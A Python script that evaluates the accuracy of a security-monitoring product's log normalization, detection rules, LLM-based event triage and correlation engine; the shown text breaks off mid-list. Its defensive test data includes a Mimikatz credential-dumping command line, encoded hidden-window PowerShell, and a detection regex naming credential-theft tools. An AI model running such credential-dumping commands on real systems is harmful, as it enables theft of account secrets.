#!/usr/bin/env python3
"""
SOC SaaS v2 -- Accuracy Evaluation Script

Measures accuracy for all four core subsystems:
  1. Log Normalization  (field extraction correctness)
  2. Detection Engine   (pattern matching Precision / Recall / F1)
  3. AI Analyzer        (parse accuracy + optional live LLM accuracy)
  4. Correlation Engine (rule match Precision / Recall / F1 + scoring)

Run from backend/ directory (with venv activated):
  python eval_accuracy.py            # full eval (AI live tests need .env API keys)
  python eval_accuracy.py --skip-ai  # skip LLM API calls
"""
from __future__ import annotations

import argparse
import asyncio
import os
import sys
from dataclasses import dataclass
from datetime import datetime, timezone
from typing import Any

# -- Env setup BEFORE any app imports (same pattern as unit_tests/conftest.py) -
os.environ.setdefault("DATABASE_URL", "postgresql+asyncpg://test:test@localhost/test")
os.environ.setdefault("JWT_SECRET", "eval-jwt-secret-placeholder-32chars")
os.environ.setdefault("JWT_REFRESH_SECRET", "eval-jwt-refresh-secret-placeholder-32")
os.environ.setdefault("REDIS_URL", "redis://localhost:6379/15")

# -- App imports ---------------------------------------------------------------
from app.normalization.models import (
    NormalizedEvent,
    NormalizedFile,
    NormalizedNetwork,
    NormalizedProcess,
    NormalizedUser,
)
from app.normalization.windows import normalize_windows_event
from app.normalization.linux import normalize_linux_event
from app.detection.patterns import evaluate_conditions
from app.correlation.matcher import GroupContext, match_event
from app.correlation.rules import (
    HIGH_FREQUENCY_SOURCE,
    SAME_EVENT_CHAIN,
    SAME_HOST_BURST,
    SAME_LOGON_SESSION,
    SAME_PROCESS_TREE,
    SAME_USER_MULTI_HOST,
    SHARED_DEST_IP,
    SHARED_DOMAIN,
    SHARED_FILE_HASH,
    SHARED_SOURCE_IP,
)
from app.correlation.scoring import score_match
from app.ai.analyzer import AIAnalyzer


# ===============================================================================
# METRICS HELPERS
# ===============================================================================

@dataclass
class ClassificationMetrics:
    tp: int = 0
    fp: int = 0
    tn: int = 0
    fn: int = 0

    @property
    def precision(self) -> float:
        return self.tp / (self.tp + self.fp) if (self.tp + self.fp) > 0 else 0.0

    @property
    def recall(self) -> float:
        return self.tp / (self.tp + self.fn) if (self.tp + self.fn) > 0 else 0.0

    @property
    def f1(self) -> float:
        p, r = self.precision, self.recall
        return 2 * p * r / (p + r) if (p + r) > 0 else 0.0

    @property
    def accuracy(self) -> float:
        total = self.tp + self.fp + self.tn + self.fn
        return (self.tp + self.tn) / total if total > 0 else 0.0


def _get_nested(obj: Any, path: str) -> Any:
    """Dot-notation access: 'user.name' -> obj.user.name or obj['user']['name']."""
    for part in path.split("."):
        if obj is None:
            return None
        if hasattr(obj, part):
            obj = getattr(obj, part)
        elif isinstance(obj, dict):
            obj = obj.get(part)
        else:
            return None
    return obj


def _make_base(hostname: str = "DESKTOP-TEST") -> NormalizedEvent:
    return NormalizedEvent(
        event_id="eval-001",
        timestamp=datetime.now(tz=timezone.utc),
        hostname=hostname,
        os_type="windows",
        agent_id="agent-eval",
        tenant_id="tenant-eval",
    )


# ===============================================================================
# 1. LOG NORMALIZATION
# ===============================================================================

NORM_TEST_CASES: list[dict] = [
    # -- Authentication ------------------------------------------------------
    {
        "name": "4625 Failed Logon -> auth, sev=2, user+IP extracted",
        "raw": {
            "event_id_windows": "4625",
            "TargetUserName": "john.doe",
            "TargetDomainName": "CORP",
            "IpAddress": "192.168.1.100",
            "source_name": "Microsoft-Windows-Security-Auditing",
        },
        "expected": {
            "category": "auth",
            "severity": 2,
            "user.name": "john.doe",
            "user.domain": "CORP",
            "network.src_ip": "192.168.1.100",
            "raw.windows_event_id": "4625",
        },
    },
    {
        "name": "4624 Successful Logon -> auth, sev=1, user+IP extracted",
        "raw": {
            "event_id_windows": "4624",
            "TargetUserName": "alice",
            "TargetDomainName": "CORP",
            "IpAddress": "10.0.0.5",
        },
        "expected": {
            "category": "auth",
            "severity": 1,
            "user.name": "alice",
            "network.src_ip": "10.0.0.5",
        },
    },
    {
        "name": "4740 Account Lockout -> auth, sev=3",
        "raw": {
            "event_id_windows": "4740",
            "TargetUserName": "bob",
            "TargetDomainName": "CORP",
        },
        "expected": {
            "category": "auth",
            "severity": 3,
            "user.name": "bob",
        },
    },
    {
        "name": "1102 Audit Log Cleared -> auth, sev=4 (critical)",
        "raw": {"event_id_windows": "1102"},
        "expected": {
            "category": "auth",
            "severity": 4,
            "raw.windows_event_id": "1102",
        },
    },
    {
        "name": "4672 Special Privileges -- non-system user -> is_privileged=True, sev=2",
        "raw": {
            "event_id_windows": "4672",
            "TargetUserName": "eve",
            "TargetDomainName": "CORP",
        },
        "expected": {
            "category": "auth",
            "severity": 2,
            "user.is_privileged": True,
        },
    },
    {
        "name": "4672 Special Privileges -- SYSTEM -> is_privileged=False (noise filter)",
        "raw": {
            "event_id_windows": "4672",
            "TargetUserName": "SYSTEM",
        },
        "expected": {
            "category": "auth",
            "severity": 1,
            "user.is_privileged": False,
        },
    },
    # -- Process -------------------------------------------------------------
    {
        "name": "4688 New Process -> process.name + command_line extracted",
        "raw": {
            "event_id_windows": "4688",
            "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
            "CommandLine": "cmd.exe /c whoami",
            "SubjectUserName": "admin",
        },
        "expected": {
            "category": "process",
            "process.name": "cmd.exe",
            "process.command_line": "cmd.exe /c whoami",
            "process.executable": "C:\\Windows\\System32\\cmd.exe",
        },
    },
    {
        "name": "Sysmon EID 1 Process Create -> full process fields + hashes",
        "raw": {
            "event_id_windows": "1",
            "Image": "C:\\Windows\\System32\\powershell.exe",
            "CommandLine": "powershell.exe -enc aGVsbG8=",
            "ProcessId": "4412",
            "ParentProcessId": "1234",
            "Hashes": "MD5=AABBCCDD,SHA256=EEFF001122334455",
        },
        "expected": {
            "category": "process",
            "process.name": "powershell.exe",
            "process.command_line": "powershell.exe -enc aGVsbG8=",
            "process.pid": 4412,
            "process.ppid": 1234,
            "process.hash_md5": "AABBCCDD",
            "process.hash_sha256": "EEFF001122334455",
        },
    },
    {
        "name": "4698 Scheduled Task Created -> process, sev=3",
        "raw": {"event_id_windows": "4698"},
        "expected": {"category": "process", "severity": 3},
    },
    {
        "name": "7045 New Service Installed -> process, sev=3",
        "raw": {"event_id_windows": "7045"},
        "expected": {"category": "process", "severity": 3},
    },
    {
        "name": "4104 PowerShell Script Block -> process, sev=3",
        "raw": {"event_id_windows": "4104"},
        "expected": {"category": "process", "severity": 3},
    },
    # -- Sysmon Remote Thread / Process Access (high suspicion) --------------
    {
        "name": "Sysmon EID 8 Remote Thread -> process, sev=3",
        "raw": {"event_id_windows": "8"},
        "expected": {"category": "process", "severity": 3},
    },
    # -- Network -------------------------------------------------------------
    {
        "name": "Sysmon EID 3 Network Connect -> full network fields + direction",
        "raw": {
            "event_id_windows": "3",
            "SourceIp": "10.0.0.1",
            "SourcePort": "54321",
            "DestinationIp": "8.8.8.8",
            "DestinationPort": "53",
            "Protocol": "udp",
            "Initiated": "true",
        },
        "expected": {
            "category": "network",
            "network.src_ip": "10.0.0.1",
            "network.src_port": 54321,
            "network.dst_ip": "8.8.8.8",
            "network.dst_port": 53,
            "network.direction": "outbound",
        },
    },
    {
        "name": "5157 Firewall Block -> network, sev=2, IPs extracted",
        "raw": {
            "event_id_windows": "5157",
            "SourceAddress": "10.0.0.50",
            "DestAddress": "192.168.100.1",
            "SourcePort": "1234",
            "DestPort": "22",
            "Protocol": "6",
        },
        "expected": {
            "category": "network",
            "severity": 2,
            "network.src_ip": "10.0.0.50",
            "network.dst_ip": "192.168.100.1",
            "network.protocol": "TCP",
        },
    },
    # -- Malware / Defender ---------------------------------------------------
    {
        "name": "1116 Defender Malware Detected -> sev=4",
        "raw": {"event_id_windows": "1116"},
        "expected": {"severity": 4},
    },
    # -- WMI Persistence -----------------------------------------------------
    {
        "name": "5861 WMI Permanent Consumer -> sev=3",
        "raw": {"event_id_windows": "5861"},
        "expected": {"severity": 3},
    },
    # -- Tags ----------------------------------------------------------------
    {
        "name": "Event ID title injected into tags list",
        "raw": {"event_id_windows": "4625"},
        "expected_contains": {"tags": "Failed User Logon Attempt"},
    },
    {
        "name": "WMI persistence tag injected",
        "raw": {"event_id_windows": "5861"},
        "expected_contains": {"tags": "wmi_persistence"},
    },
    # -- System account filtering ---------------------------------------------
    {
        "name": "SYSTEM account name filtered -> user.name=None",
        "raw": {
            "event_id_windows": "4624",
            "TargetUserName": "SYSTEM",
        },
        "expected": {"user.name": None},
    },
    {
        "name": "Anonymous Logon account filtered -> user.name=None",
        "raw": {
            "event_id_windows": "4624",
            "TargetUserName": "anonymous logon",
        },
        "expected": {"user.name": None},
    },
    # -- source_name -> category mapping --------------------------------------
    {
        "name": "DNS-Client source_name -> category=network",
        "raw": {
            "event_id_windows": "9999",
            "source_name": "Microsoft-Windows-DNS-Client/Operational",
        },
        "expected": {"category": "network"},
    },
    # -- Sysmon file create ---------------------------------------------------
    {
        "name": "Sysmon EID 11 File Created -> file fields extracted",
        "raw": {
            "event_id_windows": "11",
            "TargetFilename": "C:\\Users\\evil\\AppData\\Roaming\\payload.exe",
        },
        "expected": {
            "category": "file",
            "file.name": "payload.exe",
            "file.extension": "exe",
        },
    },
    # -- Registry ------------------------------------------------------------
    {
        "name": "Sysmon EID 13 Registry Value Set -> registry key extracted",
        "raw": {
            "event_id_windows": "13",
            "TargetObject": "HKLM\\Software\\Microsoft\\Windows\\Run",
            "Details": "malware.exe",
            "EventType": "SetValue",
        },
        "expected": {
            "category": "registry",
        },
    },
]


def run_normalization_tests() -> dict[str, Any]:
    print("\n" + "=" * 62)
    print("  1. LOG NORMALIZATION ACCURACY")
    print("=" * 62)

    total_fields = 0
    correct_fields = 0

    for case in NORM_TEST_CASES:
        base = _make_base()
        result = normalize_windows_event(case["raw"], base)
        errors: list[str] = []

        for path, expected_val in case.get("expected", {}).items():
            actual = _get_nested(result, path)
            total_fields += 1
            if actual == expected_val:
                correct_fields += 1
            else:
                errors.append(f"{path}: expected={expected_val!r}, got={actual!r}")

        for path, substring in case.get("expected_contains", {}).items():
            actual = _get_nested(result, path)
            total_fields += 1
            if isinstance(actual, list) and substring in actual:
                correct_fields += 1
            else:
                errors.append(f"{path}: expected to contain {substring!r}, got={actual!r}")

        status = "OK" if not errors else "XX"
        print(f"  [{status}] {case['name']}")
        for e in errors:
            print(f"        FAIL -> {e}")

    accuracy = correct_fields / total_fields if total_fields else 0.0
    print(f"\n  Field accuracy: {correct_fields}/{total_fields} = {accuracy:.1%}")
    return {"field_accuracy": accuracy, "total": total_fields, "correct": correct_fields}


# ===============================================================================
# 2. DETECTION ENGINE -- PATTERN MATCHING
# ===============================================================================

DETECTION_TEST_CASES: list[dict] = [
    # -- True Positives ------------------------------------------------------
    {
        "name": "TP: process.name eq cmd.exe",
        "conditions": [{"field": "process.name", "op": "eq", "value": "cmd.exe"}],
        "event": NormalizedEvent(process=NormalizedProcess(name="cmd.exe")),
        "should_fire": True,
    },
    {
        "name": "TP: command_line contains -enc (encoded PS)",
        "conditions": [{"field": "process.command_line", "op": "contains", "value": "-enc"}],
        "event": NormalizedEvent(process=NormalizedProcess(command_line="powershell.exe -enc aGVs")),
        "should_fire": True,
    },
    {
        "name": "TP: severity gt 2",
        "conditions": [{"field": "severity", "op": "gt", "value": 2}],
        "event": NormalizedEvent(severity=3),
        "should_fire": True,
    },
    {
        "name": "TP: severity gte 3",
        "conditions": [{"field": "severity", "op": "gte", "value": 3}],
        "event": NormalizedEvent(severity=3),
        "should_fire": True,
    },
    {
        "name": "TP: severity lte 2",
        "conditions": [{"field": "severity", "op": "lte", "value": 2}],
        "event": NormalizedEvent(severity=1),
        "should_fire": True,
    },
    {
        "name": "TP: category eq auth",
        "conditions": [{"field": "category", "op": "eq", "value": "auth"}],
        "event": NormalizedEvent(category="auth"),
        "should_fire": True,
    },
    {
        "name": "TP: process.name in [cmd.exe, powershell.exe]",
        "conditions": [{"field": "process.name", "op": "in", "value": ["cmd.exe", "powershell.exe"]}],
        "event": NormalizedEvent(process=NormalizedProcess(name="powershell.exe")),
        "should_fire": True,
    },
    {
        "name": "TP: regex mimikatz|sekurlsa",
        "conditions": [{"field": "process.command_line", "op": "regex", "value": "mimikatz|sekurlsa|lsadump"}],
        "event": NormalizedEvent(process=NormalizedProcess(command_line="mimikatz.exe sekurlsa::logonpasswords")),
        "should_fire": True,
    },
    {
        "name": "TP: network.dst_port eq 4444 (C2)",
        "conditions": [{"field": "network.dst_port", "op": "eq", "value": 4444}],
        "event": NormalizedEvent(network=NormalizedNetwork(dst_port=4444)),
        "should_fire": True,
    },
    {
        "name": "TP: multi-condition AND (cmd.exe + sev >= 2)",
        "conditions": [
            {"field": "process.name", "op": "eq", "value": "cmd.exe"},
            {"field": "severity", "op": "gte", "value": 2},
        ],
        "event": NormalizedEvent(severity=3, process=NormalizedProcess(name="cmd.exe")),
        "should_fire": True,
    },
    {
        "name": "TP: user.is_privileged eq True",
        "conditions": [{"field": "user.is_privileged", "op": "eq", "value": True}],
        "event": NormalizedEvent(user=NormalizedUser(name="admin", is_privileged=True)),
        "should_fire": True,
    },
    {
        "name": "TP: raw.windows_event_id eq 1102",
        "conditions": [{"field": "raw.windows_event_id", "op": "eq", "value": "1102"}],
        "event": NormalizedEvent(raw={"windows_event_id": "1102"}),
        "should_fire": True,
    },
    {
        "name": "TP: file.name endswith .ps1",
        "conditions": [{"field": "file.name", "op": "endswith", "value": ".ps1"}],
        "event": NormalizedEvent(file=NormalizedFile(name="payload.ps1")),
        "should_fire": True,
    },
    {
        "name": "TP: process.executable startswith C:\\Windows\\Temp",
        "conditions": [{"field": "process.executable", "op": "startswith", "value": "c:\\windows\\temp"}],
        "event": NormalizedEvent(process=NormalizedProcess(executable="C:\\Windows\\Temp\\evil.exe")),
        "should_fire": True,
    },
    {
        "name": "TP: network.dst_ip exists",
        "conditions": [{"field": "network.dst_ip", "op": "exists", "value": None}],
        "event": NormalizedEvent(network=NormalizedNetwork(dst_ip="8.8.8.8")),
        "should_fire": True,
    },
    {
        "name": "TP: category ne auth (catches non-auth events)",
        "conditions": [{"field": "category", "op": "ne", "value": "auth"}],
        "event": NormalizedEvent(category="process"),
        "should_fire": True,
    },
    {
        "name": "TP: process.name not_in whitelist",
        "conditions": [{"field": "process.name", "op": "not_in", "value": ["explorer.exe", "notepad.exe"]}],
        "event": NormalizedEvent(process=NormalizedProcess(name="cmd.exe")),
        "should_fire": True,
    },
    # -- True Negatives ------------------------------------------------------
    {
        "name": "TN: notepad.exe != cmd.exe",
        "conditions": [{"field": "process.name", "op": "eq", "value": "cmd.exe"}],
        "event": NormalizedEvent(process=NormalizedProcess(name="notepad.exe")),
        "should_fire": False,
    },
    {
        "name": "TN: severity 1 not gt 2",
        "conditions": [{"field": "severity", "op": "gt", "value": 2}],
        "event": NormalizedEvent(severity=1),
        "should_fire": False,
    },
    {
        "name": "TN: category network != auth",
        "conditions": [{"field": "category", "op": "eq", "value": "auth"}],
        "event": NormalizedEvent(category="network"),
        "should_fire": False,
    },
    {
        "name": "TN: AND fails when one condition fails",
        "conditions": [
            {"field": "process.name", "op": "eq", "value": "cmd.exe"},
            {"field": "severity", "op": "gte", "value": 4},
        ],
        "event": NormalizedEvent(severity=2, process=NormalizedProcess(name="cmd.exe")),
        "should_fire": False,
    },
    {
        "name": "TN: process.name not in list",
        "conditions": [{"field": "process.name", "op": "in", "value": ["cmd.exe", "powershell.exe"]}],
        "event": NormalizedEvent(process=NormalizedProcess(name="notepad.exe")),
        "should_fire": False,
    },
    {
        "name": "TN: regex no match",
        "conditions": [{"field": "process.command_line", "op": "regex", "value": "mimikatz|sekurlsa"}],
        "event": NormalizedEvent(process=NormalizedProcess(command_line="ipconfig /all")),
        "should_fire": False,
    },
    {
        "name": "TN: missing field (no process) -> no fire",
        "conditions": [{"field": "process.name", "op": "eq", "value": "cmd.exe"}],
        "event": NormalizedEvent(),
        "should_fire": False,
    },
    {
        "name": "TN: not_in fires False when value IS in list",
        "conditions": [{"field": "process.name", "op": "not_in", "value": ["cmd.exe", "powershell.exe"]}],
        "event": NormalizedEvent(process=NormalizedProcess(name="cmd.exe")),
        "should_fire": False,
    },
    {
        "name": "TN: network.dst_ip exists fails when None",
        "conditions": [{"field": "network.dst_ip", "op": "exists", "value": None}],
        "event": NormalizedEvent(network=NormalizedNetwork(dst_ip=None)),
        "should_fire": False,
    },
    # -- Edge / Robustness ----------------------------------------------------
    {
        "name": "EDGE: case-insensitive eq (CMD.EXE vs cmd.exe)",
        "conditions": [{"field": "process.name", "op": "eq", "value": "cmd.exe"}],
        "event": NormalizedEvent(process=NormalizedProcess(name="CMD.EXE")),
        "should_fire": True,
    },
    {
        "name": "EDGE: contains case-insensitive (-ENC vs -enc)",
        "conditions": [{"field": "process.command_line", "op": "contains", "value": "-enc"}],
        "event": NormalizedEvent(process=NormalizedProcess(command_line="PowerShell.exe -ENC BASE64DATA")),
        "should_fire": True,
    },
    {
        "name": "EDGE: empty conditions list -> fires (vacuous truth)",
        "conditions": [],
        "event": NormalizedEvent(),
        "should_fire": True,
    },
    {
        "name": "EDGE: severity lt 1 (impossible -> no fire on sev=1)",
        "conditions": [{"field": "severity", "op": "lt", "value": 1}],
        "event": NormalizedEvent(severity=1),
        "should_fire": False,
    },
]


def run_detection_tests() -> dict[str, Any]:
    print("\n" + "=" * 62)
    print("  2. DETECTION ENGINE -- PATTERN MATCHING ACCURACY")
    print("=" * 62)

    m = ClassificationMetrics()

    for case in DETECTION_TEST_CASES:
        fired = evaluate_conditions(case["conditions"], case["event"])
        expected = case["should_fire"]

        if fired and expected:
            m.tp += 1
            label = "TP"
        elif fired and not expected:
            m.fp += 1
            label = "FP"
        elif not fired and not expected:
            m.tn += 1
            label = "TN"
        else:
            m.fn += 1
            label = "FN"

        ok = label in ("TP", "TN")
        print(f"  [{'OK' if ok else 'XX'} {label}] {case['name']}")

    print(f"\n  TP={m.tp}  FP={m.fp}  TN={m.tn}  FN={m.fn}")
    print(f"  Precision: {m.precision:.1%}")
    print(f"  Recall:    {m.recall:.1%}")
    print(f"  F1:        {m.f1:.1%}")
    print(f"  Accuracy:  {m.accuracy:.1%}")
    return {"precision": m.precision, "recall": m.recall, "f1": m.f1, "accuracy": m.accuracy}


# ===============================================================================
# 3a. AI ANALYZER -- RESPONSE PARSING
# ===============================================================================

AI_PARSE_TEST_CASES: list[dict] = [
    {
        "name": "Valid malicious JSON response",
        "response": (
            '{"severity_assessment":"malicious","confidence":0.95,'
            '"mitre_technique":"T1059.001","mitre_tactic":"Execution",'
            '"summary":"Encoded PowerShell.","recommended_action":"Contain",'
            '"indicators":["powershell.exe","base64_payload"]}'
        ),
        "expected": {
            "severity_assessment": "malicious",
            "confidence": 0.95,
            "recommended_action": "Contain",
            "mitre_technique": "T1059.001",
        },
    },
    {
        "name": "Valid benign JSON response",
        "response": (
            '{"severity_assessment":"benign","confidence":0.9,'
            '"mitre_technique":null,"mitre_tactic":null,'
            '"summary":"Routine system event.","recommended_action":"Monitor","indicators":[]}'
        ),
        "expected": {
            "severity_assessment": "benign",
            "confidence": 0.9,
            "recommended_action": "Monitor",
            "mitre_technique": None,
        },
    },
    {
        "name": "Valid suspicious JSON response",
        "response": (
            '{"severity_assessment":"suspicious","confidence":0.7,'
            '"mitre_technique":null,"mitre_tactic":null,'
            '"summary":"Unusual network activity.","recommended_action":"Investigate","indicators":[]}'
        ),
        "expected": {
            "severity_assessment": "suspicious",
            "recommended_action": "Investigate",
        },
    },
    {
        "name": "Markdown fences stripped before parse",
        "response": (
            "```json\n"
            '{"severity_assessment":"suspicious","confidence":0.7,"mitre_technique":null,'
            '"mitre_tactic":null,"summary":"Unusual network.","recommended_action":"Investigate","indicators":[]}'
            "\n```"
        ),
        "expected": {
            "severity_assessment": "suspicious",
            "recommended_action": "Investigate",
        },
    },
    {
        "name": "Invalid severity -> falls back to 'unknown'",
        "response": (
            '{"severity_assessment":"HIGH_RISK","confidence":0.8,'
            '"mitre_technique":null,"mitre_tactic":null,'
            '"summary":"test","recommended_action":"Monitor","indicators":[]}'
        ),
        "expected": {"severity_assessment": "unknown", "recommended_action": "Monitor"},
    },
    {
        "name": "Confidence > 1.0 clamped to 1.0",
        "response": (
            '{"severity_assessment":"malicious","confidence":1.5,'
            '"mitre_technique":null,"mitre_tactic":null,'
            '"summary":"test","recommended_action":"Escalate","indicators":[]}'
        ),
        "expected": {"confidence": 1.0},
    },
    {
        "name": "Confidence < 0.0 clamped to 0.0",
        "response": (
            '{"severity_assessment":"benign","confidence":-0.5,'
            '"mitre_technique":null,"mitre_tactic":null,'
            '"summary":"test","recommended_action":"Monitor","indicators":[]}'
        ),
        "expected": {"confidence": 0.0},
    },
    {
        "name": "Invalid action -> falls back to 'Monitor'",
        "response": (
            '{"severity_assessment":"suspicious","confidence":0.6,'
            '"mitre_technique":null,"mitre_tactic":null,'
            '"summary":"test","recommended_action":"DELETE_ALL","indicators":[]}'
        ),
        "expected": {"recommended_action": "Monitor"},
    },
    {
        "name": "All four valid actions pass through",
        "response": (
            '{"severity_assessment":"malicious","confidence":0.9,'
            '"mitre_technique":null,"mitre_tactic":null,'
            '"summary":"test","recommended_action":"Escalate","indicators":[]}'
        ),
        "expected": {"recommended_action": "Escalate"},
    },
    {
        "name": "Indicators list parsed correctly (max 10)",
        "response": (
            '{"severity_assessment":"malicious","confidence":0.9,'
            '"mitre_technique":null,"mitre_tactic":null,'
            '"summary":"test","recommended_action":"Contain",'
            '"indicators":["ioc1","ioc2","ioc3"]}'
        ),
        "expected_contains": {"indicators": "ioc1"},
    },
    {
        "name": "Totally invalid JSON -> default result",
        "response": "this is not json at all",
        "expected": {
            "severity_assessment": "unknown",
            "confidence": 0.0,
            "recommended_action": "Monitor",
        },
    },
    {
        "name": "Empty string -> default result",
        "response": "",
        "expected": {
            "severity_assessment": "unknown",
            "confidence": 0.0,
        },
    },
    {
        "name": "Partial JSON (missing fields) -> defaults applied",
        "response": '{"severity_assessment":"malicious"}',
        "expected": {
            "severity_assessment": "malicious",
            "confidence": 0.5,
            "recommended_action": "Monitor",
        },
    },
]


def run_ai_parse_tests() -> dict[str, Any]:
    print("\n" + "=" * 62)
    print("  3a. AI ANALYZER -- RESPONSE PARSING ACCURACY")
    print("=" * 62)

    analyzer = AIAnalyzer()
    total = 0
    correct = 0

    for case in AI_PARSE_TEST_CASES:
        result = analyzer._parse_response(case["response"])
        errors: list[str] = []

        for field, expected_val in case.get("expected", {}).items():
            actual = getattr(result, field, None)
            total += 1
            if actual == expected_val:
                correct += 1
            else:
                errors.append(f"{field}: expected={expected_val!r}, got={actual!r}")

        for field, expected_item in case.get("expected_contains", {}).items():
            actual = getattr(result, field, None)
            total += 1
            if isinstance(actual, list) and expected_item in actual:
                correct += 1
            else:
                errors.append(f"{field}: expected to contain {expected_item!r}, got={actual!r}")

        status = "OK" if not errors else "XX"
        print(f"  [{status}] {case['name']}")
        for e in errors:
            print(f"        FAIL -> {e}")

    accuracy = correct / total if total else 0.0
    print(f"\n  Parse accuracy: {correct}/{total} = {accuracy:.1%}")
    return {"parse_accuracy": accuracy}


# ===============================================================================
# 3b. AI ANALYZER -- LIVE LLM ACCURACY
# ===============================================================================

AI_LIVE_TEST_CASES: list[dict] = [
    {
        "name": "Mimikatz credential dump -> MALICIOUS + Contain/Escalate",
        "event": NormalizedEvent(
            category="process",
            severity=4,
            hostname="WORKSTATION01",
            os_type="windows",
            process=NormalizedProcess(
                name="mimikatz.exe",
                command_line="mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
                executable="C:\\Users\\admin\\Downloads\\mimikatz.exe",
            ),
            user=NormalizedUser(name="admin", is_privileged=True),
        ),
        "expected_severity": "malicious",
        "expected_actions": {"Contain", "Escalate"},
    },
    {
        "name": "Brute force failed logins (external IP) -> SUSPICIOUS/MALICIOUS + Investigate/Contain",
        "event": NormalizedEvent(
            category="auth",
            severity=3,
            hostname="DC01",
            os_type="windows",
            user=NormalizedUser(name="administrator"),
            network=NormalizedNetwork(src_ip="185.220.101.45"),
            tags=["Failed User Logon Attempt"],
        ),
        "expected_severity": {"suspicious", "malicious"},
        "expected_actions": {"Investigate", "Contain", "Escalate"},
    },
    {
        "name": "Routine notepad.exe -> BENIGN + Monitor",
        "event": NormalizedEvent(
            category="process",
            severity=1,
            hostname="DESKTOP-USER",
            os_type="windows",
            process=NormalizedProcess(
                name="notepad.exe",
                command_line="notepad.exe C:\\Users\\user\\Documents\\notes.txt",
                executable="C:\\Windows\\System32\\notepad.exe",
            ),
            user=NormalizedUser(name="alice"),
        ),
        "expected_severity": "benign",
        "expected_actions": {"Monitor"},
    },
    {
        "name": "Audit log cleared (1102) -> MALICIOUS + Escalate/Contain",
        "event": NormalizedEvent(
            category="auth",
            severity=4,
            hostname="DC01",
            os_type="windows",
            raw={"windows_event_id": "1102"},
            tags=["Security Audit Log Cleared"],
        ),
        "expected_severity": "malicious",
        "expected_actions": {"Escalate", "Contain", "Investigate"},
    },
    {
        "name": "WMI permanent consumer (persistence) -> SUSPICIOUS/MALICIOUS + Investigate/Contain",
        "event": NormalizedEvent(
            category="other",
            severity=3,
            hostname="SERVER01",
            os_type="windows",
            tags=["wmi_persistence", "WMI Permanent Event Consumer Created"],
        ),
        "expected_severity": {"suspicious", "malicious"},
        "expected_actions": {"Investigate", "Contain", "Escalate"},
    },
    {
        "name": "Encoded PowerShell (T1059.001) -> SUSPICIOUS/MALICIOUS",
        "event": NormalizedEvent(
            category="process",
            severity=3,
            hostname="WORKSTATION02",
            os_type="windows",
            process=NormalizedProcess(
                name="powershell.exe",
                command_line="powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgA...",
            ),
            tags=["PowerShell Script Block Logged"],
        ),
        "expected_severity": {"suspicious", "malicious"},
        "expected_actions": {"Investigate", "Contain", "Escalate"},
    },
    {
        "name": "Scheduled task created (off-hours) -> SUSPICIOUS/MALICIOUS",
        "event": NormalizedEvent(
            category="process",
            severity=3,
            hostname="FILESERVER01",
            os_type="windows",
            raw={"windows_event_id": "4698"},
            tags=["Scheduled Task Created"],
        ),
        "expected_severity": {"suspicious", "malicious"},
        "expected_actions": {"Investigate", "Contain", "Escalate", "Monitor"},
    },
    {
        "name": "Windows Update (benign noise) -> BENIGN",
        "event": NormalizedEvent(
            category="other",
            severity=1,
            hostname="DESKTOP-OPS",
            os_type="windows",
            raw={"windows_event_id": "10029"},
            tags=["Windows Update Download Started"],
        ),
        "expected_severity": "benign",
        "expected_actions": {"Monitor"},
    },
]


async def run_ai_live_tests() -> dict[str, Any]:
    print("\n" + "-" * 62)
    print("  3b. AI ANALYZER -- LIVE LLM ACCURACY")
    print("-" * 62)

    try:
        from app.ai.llm_manager import get_llm_manager
        get_llm_manager()
    except RuntimeError as e:
        print(f"  SKIP -- {e}")
        print("  Tip: set GROQ_API_KEY or GEMINI_API_KEY in backend/.env")
        return {"live_accuracy": None, "skipped": True}

    analyzer = AIAnalyzer()
    severity_correct = 0
    action_correct = 0
    total = len(AI_LIVE_TEST_CASES)

    for case in AI_LIVE_TEST_CASES:
        print(f"  Testing: {case['name']}")
        print(f"           ...", end=" ", flush=True)
        try:
            result = await analyzer.analyze(case["event"])
            expected_sev = case["expected_severity"]
            sev_ok = (
                result.severity_assessment in expected_sev
                if isinstance(expected_sev, set)
                else result.severity_assessment == expected_sev
            )
            act_ok = result.recommended_action in case["expected_actions"]
            severity_correct += int(sev_ok)
            action_correct += int(act_ok)

            sev_mark = "OK" if sev_ok else "XX"
            act_mark = "OK" if act_ok else "XX"
            print(
                f"severity [{sev_mark}] {result.severity_assessment!r}  "
                f"action [{act_mark}] {result.recommended_action!r}  "
                f"conf={result.confidence:.2f}"
            )
        except Exception as exc:
            print(f"ERROR -- {exc}")

    sev_acc = severity_correct / total if total else 0.0
    act_acc = action_correct / total if total else 0.0
    combined = (severity_correct + action_correct) / (2 * total) if total else 0.0
    print(f"\n  Severity accuracy:  {severity_correct}/{total} = {sev_acc:.1%}")
    print(f"  Action accuracy:    {action_correct}/{total} = {act_acc:.1%}")
    print(f"  Combined accuracy:  {combined:.1%}")
    return {
        "live_accuracy": combined,
        "severity_accuracy": sev_acc,
        "action_accuracy": act_acc,
    }


# ===============================================================================
# 4. CORRELATION ENGINE
# ===============================================================================

_CID  = "corr-eval-001"
_SID  = "sess-eval-002"
_PTID = "ptid-eval-003"
_ECID = "ecid-eval-004"

CORRELATION_TEST_CASES: list[dict] = [
    # -- True Positives ------------------------------------------------------
    {
        "name": "TP: same_host_burst fires at threshold=3",
        "payload": {"correlation_id": _CID, "entities": []},
        "counts": {(f"cid:{_CID}", SAME_HOST_BURST.window_seconds): 3},
        "expected_rules": {"same_host_burst"},
    },
    {
        "name": "TP: same_host_burst fires above threshold=5",
        "payload": {"correlation_id": _CID, "entities": []},
        "counts": {(f"cid:{_CID}", SAME_HOST_BURST.window_seconds): 5},
        "expected_rules": {"same_host_burst"},
    },
    {
        "name": "TP: same_logon_session fires at 2",
        "payload": {"session_id": _SID, "entities": []},
        "counts": {(f"sid:{_SID}", SAME_LOGON_SESSION.window_seconds): 2},
        "expected_rules": {"same_logon_session"},
    },
    {
        "name": "TP: same_process_tree fires at 2",
        "payload": {"process_tree_id": _PTID, "entities": []},
        "counts": {(f"ptid:{_PTID}", SAME_PROCESS_TREE.window_seconds): 2},
        "expected_rules": {"same_process_tree"},
    },
    {
        "name": "TP: same_event_chain fires at 2",
        "payload": {"event_chain_id": _ECID, "entities": []},
        "counts": {(f"ecid:{_ECID}", SAME_EVENT_CHAIN.window_seconds): 2},
        "expected_rules": {"same_event_chain"},
    },
    {
        "name": "TP: shared_source_ip fires at 2 (inbound)",
        "payload": {"entities": [{"key": "ip:10.0.0.1", "direction": "inbound"}]},
